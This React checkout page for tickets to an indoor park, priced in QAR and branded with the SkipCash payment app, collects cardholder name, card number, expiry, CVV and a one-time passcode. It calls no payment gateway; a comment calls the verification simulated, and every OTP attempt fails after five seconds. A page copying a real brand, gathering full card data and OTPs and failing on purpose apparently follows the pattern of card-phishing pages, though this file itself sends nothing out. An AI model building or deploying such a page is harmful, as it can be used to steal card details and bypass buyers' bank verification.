import { useEffect, useMemo, useRef, useState } from "react";
import { format } from "date-fns";
import { AlertCircle, CreditCard, Loader2, ShieldCheck } from "lucide-react";
import { QuestLegalFooter, QuestMobileTopBar, SessionTimerStrip } from "@/components/QuestMobileChrome";
import {
  buildTicketOrderItems,
  formatQar,
  getOrderSubtotal,
  getStoredTicketCart,
  ticketProductMap,
} from "@/lib/ticket-cart";

interface BillingDetails {
  firstName: string;
  lastName: string;
  phone: string;
  email: string;
}

interface CardDetails {
  cardholderName: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
}

type PaymentStep = "idle" | "waitingOtp" | "otp" | "verifyingOtp" | "failed";

function parseStoredDate(storedDate: string | null): Date | undefined {
  if (!storedDate) {
    return undefined;
  }

  const dateOnlyMatch = /^(\d{4})-(\d{2})-(\d{2})$/.exec(storedDate);
  if (dateOnlyMatch) {
    const [, year, month, day] = dateOnlyMatch;
    return new Date(Number(year), Number(month) - 1, Number(day));
  }

  const parsed = new Date(storedDate);
  return Number.isNaN(parsed.getTime()) ? undefined : parsed;
}

function toDigitsOnly(value: string): string {
  return value.replace(/\D/g, "");
}

function formatCardNumber(value: string): string {
  const digits = toDigitsOnly(value).slice(0, 19);
  return digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim();
}

function formatExpiry(value: string): string {
  const digits = toDigitsOnly(value).slice(0, 4);
  if (digits.length <= 2) {
    return digits;
  }

  return `${digits.slice(0, 2)}/${digits.slice(2)}`;
}

function validateCardDetails(card: CardDetails): string | null {
  if (!card.cardholderName.trim()) {
    return "Cardholder name is required.";
  }

  const cardNumberLength = toDigitsOnly(card.cardNumber).length;
  if (cardNumberLength < 13 || cardNumberLength > 19) {
    return "Please enter a valid card number.";
  }

  if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(card.expiry)) {
    return "Expiry date must be in MM/YY format.";
  }

  if (!/^\d{3,4}$/.test(card.cvv)) {
    return "Please enter a valid CVV.";
  }

  return null;
}

export default function Checkout() {
  const [billingDetails, setBillingDetails] = useState<BillingDetails>({
    firstName: "",
    lastName: "",
    phone: "",
    email: "",
  });
  const [storedCart] = useState(() => getStoredTicketCart());
  const [cardDetails, setCardDetails] = useState<CardDetails>({
    cardholderName: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
  });
  const [otpCode, setOtpCode] = useState("");
  const [paymentStep, setPaymentStep] = useState<PaymentStep>("idle");
  const [paymentError, setPaymentError] = useState<string | null>(null);
  const otpRevealTimerRef = useRef<number | null>(null);
  const otpVerifyTimerRef = useRef<number | null>(null);

  const storedOrderItems = useMemo(() => buildTicketOrderItems(storedCart.quantities), [storedCart.quantities]);
  const fallbackItem = {
    id: "adult" as const,
    name: ticketProductMap.adult.name,
    unitPrice: ticketProductMap.adult.unitPrice,
    quantity: 1,
  };
  const orderItems = storedOrderItems.length > 0 ? storedOrderItems : [fallbackItem];
  const subtotal = useMemo(() => getOrderSubtotal(orderItems), [orderItems]);

  const visitDate = parseStoredDate(storedCart.visitDateIso);
  const bookingDateText = visitDate ? format(visitDate, "d MMM, yyyy") : "17 Feb, 2026";
  const visitTime = storedCart.visitTime ?? "17:30 - 23:59";

  useEffect(() => {
    return () => {
      if (otpRevealTimerRef.current) {
        window.clearTimeout(otpRevealTimerRef.current);
      }
      if (otpVerifyTimerRef.current) {
        window.clearTimeout(otpVerifyTimerRef.current);
      }
    };
  }, []);

  const onProceedToPayment = () => {
    if (otpRevealTimerRef.current) {
      window.clearTimeout(otpRevealTimerRef.current);
    }
    if (otpVerifyTimerRef.current) {
      window.clearTimeout(otpVerifyTimerRef.current);
    }

    const cardValidationError = validateCardDetails(cardDetails);
    if (cardValidationError) {
      setPaymentStep("idle");
      setPaymentError(cardValidationError);
      return;
    }

    setPaymentError(null);
    setOtpCode("");
    setPaymentStep("waitingOtp");

    otpRevealTimerRef.current = window.setTimeout(() => {
      setPaymentStep("otp");
    }, 5000);
  };

  const onVerifyOtp = () => {
    if (otpVerifyTimerRef.current) {
      window.clearTimeout(otpVerifyTimerRef.current);
    }

    if (otpCode.trim().length < 4) {
      setPaymentError("Please enter the OTP sent to your mobile.");
      return;
    }

    setPaymentError(null);
    setPaymentStep("verifyingOtp");

    // Simulate gateway verification; after 5s show explicit failure.
    otpVerifyTimerRef.current = window.setTimeout(() => {
      setPaymentStep("failed");
      setPaymentError("OTP verification failed. Please check and try again.");
    }, 5000);
  };

  const showOtpForm = paymentStep === "otp" || paymentStep === "verifyingOtp" || paymentStep === "failed";

  return (
    <div className="min-h-screen bg-[#efefef] text-[#333]">
      <div className="mx-auto flex min-h-screen w-full max-w-[1100px] flex-col bg-[#efefef]">
        <section className="relative h-[190px] overflow-hidden sm:h-[220px] md:h-[280px]">
          <img
            src="https://images.unsplash.com/photo-1569263979104-865ab7cd8d13?auto=format&fit=crop&w=1200&q=80"
            alt="Colorful carousel at indoor park"
            className="h-full w-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-t from-black/55 to-black/5" />
          <h1 className="absolute bottom-8 left-6 text-4xl font-black text-white sm:text-5xl">Checkout</h1>
        </section>

        <QuestMobileTopBar />

        <main className="flex-1 px-4 pb-8 pt-4 sm:px-6 md:px-8">
          <SessionTimerStrip className="max-w-[560px]" />

          <div className="mt-4 grid gap-7 lg:grid-cols-[1.1fr_1fr] lg:items-start">
            <div>
              <section className="bg-[#e9edf3] p-4 border-l-4 border-l-[hsl(var(--quest-purple))] text-[#5f5f5f] text-sm">
                <p>
                  Have a coupon?
                  <span className="ml-1 text-[#4d4d4d]">Click here to enter your code</span>
                </p>
              </section>

              <section className="mt-6">
                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">
                  Billing Details
                </h2>

                <form className="mt-4 grid gap-3 sm:grid-cols-2">
                  <label className="block">
                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                      First name <span className="text-[#bf2828]">*</span>
                    </span>
                    <input
                      type="text"
                      value={billingDetails.firstName}
                      onChange={(event) =>
                        setBillingDetails((current) => ({ ...current, firstName: event.target.value }))
                      }
                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                    />
                  </label>

                  <label className="block">
                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                      Last name <span className="text-[#bf2828]">*</span>
                    </span>
                    <input
                      type="text"
                      value={billingDetails.lastName}
                      onChange={(event) =>
                        setBillingDetails((current) => ({ ...current, lastName: event.target.value }))
                      }
                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                    />
                  </label>

                  <label className="block">
                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                      Phone <span className="text-[#bf2828]">*</span>
                    </span>
                    <input
                      type="tel"
                      value={billingDetails.phone}
                      onChange={(event) => setBillingDetails((current) => ({ ...current, phone: event.target.value }))}
                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                    />
                  </label>

                  <label className="block sm:col-span-2">
                    <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                      Email address <span className="text-[#bf2828]">*</span>
                    </span>
                    <input
                      type="email"
                      value={billingDetails.email}
                      onChange={(event) => setBillingDetails((current) => ({ ...current, email: event.target.value }))}
                      className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                    />
                  </label>
                </form>
              </section>
            </div>

            <div>
              <section>
                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">Your Order</h2>

                <div className="mt-3 overflow-hidden rounded-md border border-[#dedede] bg-white">
                  <div className="grid grid-cols-[1fr_auto] bg-[#f8bf14] px-3 py-2 text-sm font-bold text-[#202020]">
                    <span>Product</span>
                    <span>Subtotal</span>
                  </div>

                  <div className="space-y-2 px-3 py-3 text-xs text-[#444]">
                    {orderItems.map((item) => (
                      <div key={item.id}>
                        <div className="grid grid-cols-[1fr_auto] items-start gap-2">
                          <div>
                            <p className="font-semibold">
                              {item.name} <span className="font-normal">x {item.quantity}</span>
                            </p>
                            <p className="mt-1 text-[11px] text-[#666]">Booking Date: {bookingDateText}</p>
                            <p className="text-[11px] text-[#666]">Visit Time: {visitTime}</p>
                            <p className="text-[11px] text-[#666]">Category: Admission Tickets</p>
                          </div>
                          <p>{formatQar(item.unitPrice * item.quantity)}</p>
                        </div>
                      </div>
                    ))}

                    <div className="border-t border-[#ededed] pt-2">
                      <div className="flex items-center justify-between text-sm font-semibold">
                        <span>Subtotal</span>
                        <span>{formatQar(subtotal)}</span>
                      </div>
                      <div className="mt-1 flex items-center justify-between text-sm font-bold">
                        <span>Total</span>
                        <span>{formatQar(subtotal)}</span>
                      </div>
                    </div>
                  </div>
                </div>
              </section>

              <section className="mt-7">
                <h2 className="text-[2rem] font-black text-[hsl(var(--quest-purple))] sm:text-[2.15rem]">Payments</h2>

                <div className="mt-3 rounded-xl border border-[#e8e8e8] bg-white p-3">
                  <div className="rounded-md border border-[#ececec] bg-[#f8f8f8] px-3 py-2 text-sm font-semibold text-[#3e3e3e] flex items-center gap-2">
                    <CreditCard className="h-4 w-4" />
                    Credit / Debit Cards
                  </div>

                  <p className="mt-3 text-xs leading-5 text-[#444]">
                    SkipCash is a payment app that offers a convenient and enjoyable experience throughout the payments
                    journey for both consumers and merchants.
                  </p>

                  <form
                    className="mt-4 space-y-3 rounded-md border border-[#ececec] p-3"
                    onSubmit={(event) => event.preventDefault()}
                  >
                    <label className="block">
                      <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                        Cardholder Name <span className="text-[#bf2828]">*</span>
                      </span>
                      <input
                        type="text"
                        autoComplete="cc-name"
                        value={cardDetails.cardholderName}
                        onChange={(event) =>
                          setCardDetails((current) => ({ ...current, cardholderName: event.target.value }))
                        }
                        className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                        placeholder="Name on card"
                      />
                    </label>

                    <label className="block">
                      <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                        Card Number <span className="text-[#bf2828]">*</span>
                      </span>
                      <input
                        type="text"
                        inputMode="numeric"
                        autoComplete="cc-number"
                        value={cardDetails.cardNumber}
                        onChange={(event) =>
                          setCardDetails((current) => ({ ...current, cardNumber: formatCardNumber(event.target.value) }))
                        }
                        className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                        placeholder="4242 4242 4242 4242"
                      />
                    </label>

                    <div className="grid grid-cols-2 gap-3">
                      <label className="block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          Expiry <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="text"
                          inputMode="numeric"
                          autoComplete="cc-exp"
                          value={cardDetails.expiry}
                          onChange={(event) =>
                            setCardDetails((current) => ({ ...current, expiry: formatExpiry(event.target.value) }))
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                          placeholder="MM/YY"
                        />
                      </label>

                      <label className="block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          CVV <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="password"
                          inputMode="numeric"
                          autoComplete="cc-csc"
                          value={cardDetails.cvv}
                          onChange={(event) =>
                            setCardDetails((current) => ({
                              ...current,
                              cvv: toDigitsOnly(event.target.value).slice(0, 4),
                            }))
                          }
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                          placeholder="***"
                        />
                      </label>
                    </div>
                  </form>

                  {paymentStep === "waitingOtp" ? (
                    <div className="mt-3 flex items-start gap-2 rounded-md border border-[#e3d5ff] bg-[#f7f2ff] px-3 py-2 text-xs text-[#5c3f8a]">
                      <Loader2 className="mt-0.5 h-3.5 w-3.5 animate-spin" />
                      <p>Processing card details. OTP will be shown in 5 seconds.</p>
                    </div>
                  ) : null}

                  {showOtpForm ? (
                    <div className="mt-3 rounded-md border border-[#ececec] p-3">
                      <div className="flex items-center gap-2 text-sm font-semibold text-[#414141]">
                        <ShieldCheck className="h-4 w-4 text-[hsl(var(--quest-purple))]" />
                        OTP Verification
                      </div>

                      <label className="mt-2 block">
                        <span className="mb-1 block text-xs font-semibold text-[#5b5b5b]">
                          Enter OTP <span className="text-[#bf2828]">*</span>
                        </span>
                        <input
                          type="text"
                          inputMode="numeric"
                          value={otpCode}
                          onChange={(event) => setOtpCode(toDigitsOnly(event.target.value).slice(0, 6))}
                          className="h-10 w-full rounded-sm border border-[#e5e5e5] bg-white px-3 text-sm outline-none focus:border-[hsl(var(--quest-purple))]/40"
                          placeholder="6-digit OTP"
                        />
                      </label>

                      <button
                        type="button"
                        onClick={onVerifyOtp}
                        disabled={paymentStep === "verifyingOtp"}
                        className="mt-3 w-full rounded border border-[hsl(var(--quest-purple))]/25 bg-white px-4 py-2 text-sm font-semibold text-[hsl(var(--quest-purple))] hover:bg-[hsl(var(--quest-purple))]/5 disabled:cursor-not-allowed disabled:opacity-70"
                      >
                        {paymentStep === "verifyingOtp" ? "Verifying OTP..." : "Verify OTP"}
                      </button>
                    </div>
                  ) : null}

                  {paymentError ? (
                    <div className="mt-3 flex items-start gap-2 rounded-md border border-[#efc1c1] bg-[#fdf1f1] px-3 py-2 text-xs text-[#ad3030]">
                      <AlertCircle className="mt-0.5 h-3.5 w-3.5 shrink-0" />
                      <p>{paymentError}</p>
                    </div>
                  ) : null}

                  <p className="mt-4 text-xs leading-5 text-[#666]">
                    Your personal data will be used to process your order, support your experience throughout this
                    website, and for other purposes described in our privacy policy.
                  </p>

                  <button
                    type="button"
                    onClick={onProceedToPayment}
                    disabled={paymentStep === "waitingOtp" || paymentStep === "verifyingOtp"}
                    className="mt-4 w-full rounded bg-[hsl(var(--quest-purple))] px-4 py-2 text-sm font-semibold text-white hover:opacity-90 disabled:cursor-not-allowed disabled:opacity-70"
                  >
                    {paymentStep === "waitingOtp" ? "Requesting OTP..." : "Proceed to Payment"}
                  </button>
                </div>
              </section>
            </div>
          </div>
        </main>

        <QuestLegalFooter />
      </div>
    </div>
  );
}
